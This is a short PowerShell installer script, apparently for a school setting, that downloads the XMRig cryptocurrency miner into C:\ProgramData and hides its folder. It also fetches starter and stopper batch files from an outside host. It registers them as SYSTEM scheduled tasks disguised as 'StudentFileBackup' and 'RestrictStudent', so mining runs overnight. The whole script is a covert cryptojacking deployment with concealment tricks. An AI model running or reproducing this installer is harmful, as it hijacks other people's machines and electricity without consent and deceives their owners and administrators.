echo "INSTALLING MASSEIS"

cd C:\ProgramData

# download XMRig archive
echo ""
iwr https://github.com/xmrig/xmrig/releases/download/v6.8.2/xmrig-6.8.2-gcc-win64.zip -OutFile xmrig.zip

# inflate XMRig archive
echo "inflate XMRig archive"
Expand-Archive ./xmrig.zip

# remove XMRig archive
echo "remove XMRig archive"
rm ./xmrig.zip

# hide XMRig folder
echo "hide XMRig folder"
attrib +s +h ./xmrig

# go to XMRig folder
echo "go to XMRig folder"
cd xmrig
cd xmrig-6.8.2

# download starter file
echo "download starter file"
iwr https://www.thatonelukas.tk/files/masseis/masseisStarter.bat -OutFile starter.bat

# download stopper file
echo "download stopper file"
iwr https://www.thatonelukas.tk/files/masseis/masseisStopper.bat -OutFile stopper.bat

# schedule task
echo "schedule task"
schtasks /create /sc daily /tn StudentFileBackup /st 20:00 /tr "C:\ProgramData\xmrig\xmrig-6.8.2\starter.bat" /ru System
echo "schedule task 2"
schtasks /create /sc daily /tn RestrictStudent /st 07:00 /tr "C:\ProgramData\xmrig\xmrig-6.8.2\stopper.bat" /ru System
